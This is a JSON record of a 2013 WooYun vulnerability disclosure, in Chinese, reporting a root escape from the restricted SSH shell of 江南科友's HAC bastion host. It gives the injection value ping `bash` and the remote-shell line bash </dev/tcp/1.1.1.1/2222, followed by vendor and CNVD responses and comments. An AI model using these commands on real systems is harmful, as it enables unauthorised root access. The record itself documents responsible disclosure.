{"id": 9051, "wybug_id": "wooyun-2013-028617", "wybug_title": "江南科友运维审计系统可Root", "wybug_corp": "江南科友", "wybug_author": "小熊饼干", "wybug_date": "2013-07-12 10:41", "wybug_open_date": "2013-10-10 10:42", "wybug_type": "权限控制绕过", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "已交由第三方合作机构(cncert国家互联网应急中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["沙盒环境绕过", "堡垒主机"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2013-07-12：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2013-07-16：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2013-07-19：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2013-09-09：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2013-09-19：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2013-09-29：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2013-10-10：\t细节向公众公开  简要描述： 江南科友hac运维审计系统是一款用于审计的堡垒主机系统，属于内网安全非常重要的系统，且其自称服务于银行、证券、电力、医疗等诸多行业，一些常见的银行，交通银行、民生银行等等等就采用其服务；但是这个设备存在严重漏洞，可直接获取root权限。。     详细说明：  江南科友hac运维审计系统，下称HAC。有次正好有机会摸到了这个NB闪闪的东西，一时兴起，就测了下其SSH shell的安全性。使用一个普通用户SSH登录HAC后，shell做了较严格限制，发现只能执行echo / ssh / ping 命令（具体忘掉是哪几个了，没注意...），无任何其他命令。我勒个去，好nb的样子，貌似没啥漏洞。就在要放弃的时候，输入了个ping `bash`,突然就成功获得了一个bash，如下图：\n\n貌似有戏了，不过执行了各种强大的命令，如ls，pwd，都不见有输出，也没有报错（如命令不存在，无权限执行），看起来很奇怪的样子...直觉是命令可以执行，但是把命令的输出都给重定向了，真是坑爹...不过没关系，我们有下面这个NB闪闪的命令bash </dev/tcp/1.1.1.1/2222竟然真的得到了一个shell，而且竟然直接就是root shell...太尼玛顺利了吧...赶紧ps下看看：\n\n顺便看了下之前一直读不到的/etc/passwd：\n\nhacuser 的uid/gid竟然都是0...结合图2 pts/1 对应的进程树，看来普通用户登录进来就是root权限，只不过可执行的没几个命令...ps 了一下，看了都有啥进程，发现更亮的东西在下面，请保护好眼睛：\n\n\n\n我沉思了好久，始终不知道如何才能把.exe文件弄到linux上运行...好吧，就写到这吧，root都有了，该干啥干啥去了   漏洞证明：  略   修复方案：  NB厂商自己好好琢磨琢磨吧   版权声明：转载请注明来源 小熊饼干@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：20  确认时间：2013-07-16 22:57 厂商回复： 至16日，暂未能找到实例或本地案例进行复现（注：由于不具有该设备，CNVD已经在协调多方进行验证）。先行根据图片按通用软硬件漏洞进行确认，在未能及时复现的情况下，将转发给厂商，由其确认并处置。该系统多部署在内部网络，因此远程危害性稍微小一些。rank 20  最新状态： 2013-07-24：转发江南科友厂商的回复意见：在对漏洞原理进行准确定位后，我司组织开发人员与安全工程师立即展开相关的修补加固工作，针对该漏洞，开发针对性的修补包，严格限制用户的输入输出，并在所有版本上进行测试，确保修补包的有效性、安全性、稳定性。修补包的工作将在本周内完成。我司后续工作计划如下：1、\t向存在该漏洞的用户主动发送漏洞公告和提供升级补丁包，并协助用户完成该漏洞的修补工作；2、\t启动对系统内嵌的开源软件及操作环境的全面渗透分析工作，并在安全设计、编码等各阶段，对存在的安全问题进行梳理，防范可能存在的安全风险；3、\t充分利用第三方资源，引入外部可靠性测试与安全性检测，提升产品的质量。谨此，我司真诚对“小熊饼干”及www.wooyun.org致以谢意。  ", "replys": "漏洞评价：\n评论\n     2013-07-12 11:20 |    \t\tspringemp \t\t\t( 路人 |\t\t\t        Rank:20 漏洞数:4        | 打酱油～偶尔买点盐～)\t\t \n  哎呀，堡垒机啊，卤煮NB了~    \n     2013-07-12 15:07 |    \t\t洛丽潞丽 \t\t\t( 路人 |\t\t\t        Rank:22 漏洞数:4        | 专注殴打GOV30年)\t\t \n  是新版还是旧版的？    \n     2013-08-27 17:17 |    \t\txiaoL \t\t\t( 普通白帽子  |\t\t\t        Rank:361 漏洞数:67        | PKAV技术宅社区!Blog:http://www.xlixli....)\t\t \n  我能说很喜欢厂商的跟进嘛！    \n     2013-10-10 20:50 |    \t\tat0xm \t\t\t( 路人 |\t\t\t        Rank:16 漏洞数:2        | I love Chao)\t\t \n  首先以普通权限进入hac。这一步之前你怎么省略了。只能说在linux下可以执行文件只要有x权限就行了。叫“我去年买个表.dll”都可以    \n     2014-01-24 17:36 |    \t\twefgod \t\t\t( 普通白帽子  |\t\t\t        Rank:1807 漏洞数:179        | 力不从心)\t\t \n  居然不下源码来    \n     2014-02-18 21:16 |    \t\twefgod \t\t\t( 普通白帽子  |\t\t\t        Rank:1807 漏洞数:179        | 力不从心)\t\t \n  哈哈    \n     2014-03-27 15:31 |    \t\t猪头子 \t\t\t( 普通白帽子  |\t\t\t        Rank:189 漏洞数:35        | 自信的看着队友rm -rf/tar挂服务器)\t\t \n  exe是怎么在linux上运行的呢？我陷入了深深地沉思。。。    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 20, "Ranks": null}